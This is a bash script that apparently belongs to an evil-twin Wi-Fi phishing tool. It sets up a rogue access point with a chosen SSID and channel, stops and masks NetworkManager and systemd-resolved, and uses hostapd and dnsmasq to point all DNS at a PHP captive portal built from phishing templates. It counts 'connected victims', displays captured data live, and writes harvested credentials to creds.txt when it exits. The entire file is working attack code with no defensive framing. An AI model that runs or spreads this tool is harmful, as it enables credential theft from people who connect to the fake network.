#!/bin/bash
export TERM=xterm
trap ctrl_c INT
function ctrl_c(){
	echo -e " Exiting..."
	./src/reset.sh ap
	rm -r page/captive_portal/html_page

	if [ -n "$(/bin/cat ./pages/$template/data.txt 2>&1)" ];then
		/bin/cat ./page/captive_portal/data.txt 2> /dev/null > creds.txt
		rm ./page/captive_portal/data.txt
	fi
	exit 0
}

interface=$(/bin/cat ./content/interface)
echo $interface

function configure_interface(){
	echo ". . . . Creating interface in AP mode"
	
	iw dev $interface interface add ap0 type __ap > /dev/null

	ip addr add 10.10.0.1/24 dev ap0 > /dev/null
	ip link set ap0 up > /dev/null
	sleep 1
	if ! ip link show ap0 > /dev/null 2>&1;then
		echo "Error creating the interface"
		exit 1
	fi
}


##############################    data    ########################################################

function ap_data(){
	use_ssid=""
	use_channel=""
	template_index=""
	pass="a"
	while [ -z "$use_ssid" ]; do
		echo -ne "\nNetwork SSID: " && read -r use_ssid
	done

	while [ -z "$use_channel" ] || [ "$use_channel" -lt 1 ] || [ "$use_channel" -gt 12 ]; do
		echo -ne "\nSpecify a channel (1-12): " && read -r use_channel
	done

	while [ -n "$pass" ] && { [ "${#pass}" -lt 8 ] || [ "${#pass}" -gt 63 ]; }; do
		echo -ne "\nSpecify the password (8:63 chars): " && read -r pass
	done

	templates=()
	for dir in page/templates/*/; do
		[ -d "$dir" ] && templates+=("$(basename "$dir")")
	done

	echo -ne "\n====Available Templates====\n"
	for i in "${!templates[@]}"; do
		echo -ne "$i: ${templates[$i]}\n"
	done

	while [ -z "$template_index" ] || [ "$template_index" -ge "${#templates[@]}" ] || [ "$template_index" -lt 0 ]; do
		echo -ne "\nTemplate for the captive portal: " && read -r template_index
	done
	template=${templates[$template_index]}
}

##############################    Attack    ##########################################

function start_ap(){
	echo -e "\n\nCreating the AP"
	echo -e "\n. . . . Killing processes that may interfere"
	sleep 1

# -- setup --
	systemctl -q stop wpa_supplicant NetworkManager 2> /dev/null
	systemctl -q mask wpa_supplicant NetworkManager 2> /dev/null
	systemctl -q stop systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved 2> /dev/null
	systemctl -q mask systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved 2> /dev/null
	sleep 1

	pkill dnsmasq >/dev/null 2>&1
	pkill hostapd >/dev/null 2>&1

# -- config --
	echo -e ". . . . Configuring hostapd"

/bin/cat > content/hostapd.conf << EOF
interface=ap0
driver=nl80211
ssid=$use_ssid
hw_mode=g
channel=$use_channel
macaddr_acl=0
auth_algs=1
EOF
if [ "$pass" != "" ]; then
	echo -e "wpa=2\n" >> content/hostapd.conf
	echo -e "wpa_passphrase=$pass" >> content/hostapd.conf
fi

	
	echo -e ". . . . Configuring dnsmasq"

/bin/cat > content/dnsmasq.conf << EOF
interface=ap0
listen-address=10.10.0.1
dhcp-range=10.10.0.2,10.10.0.30,255.255.255.0,1h
dhcp-option=3,10.10.0.1
address=/#/10.10.0.1
dhcp-authoritative
EOF

# -- start --
	configure_interface

	hostapd content/hostapd.conf > /dev/null &
	sleep 3
	dnsmasq -C content/dnsmasq.conf > /dev/null

	echo -e "\nAP named $use_ssid created\n"
	sleep 1
}

function hosts_connect(){
	activehosts=0
	captured_data=""
	while true;do
		clear
		echo -e "\n----------------------------------------------------------"
		echo -e "\nConnected victims: $activehosts\n"
		echo -e "\nCaptured data: $captured_data\n"
		echo -e "----------------------------------------------------------"
		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "10.10.0.1 " | wc -l 2> /dev/null)
		captured_data=$(/bin/cat ./page/captive_portal/data.txt 2>/dev/null)
		sleep 2
	done

}

function portal(){
	echo -e ". . . . Configuring captive portal"
	sleep 0.5
	pushd page/captive_portal > /dev/null 2>&1
	rm -r html_page 2> /dev/null
	cp -r ../templates/$template html_page/
	php -S 10.10.0.1:80 > /dev/null 2>&1 &
	sleep 1
	popd > /dev/null 2>&1
}

################################    Program start    #############################

clear
ap_data

start_ap
portal

hosts_connect

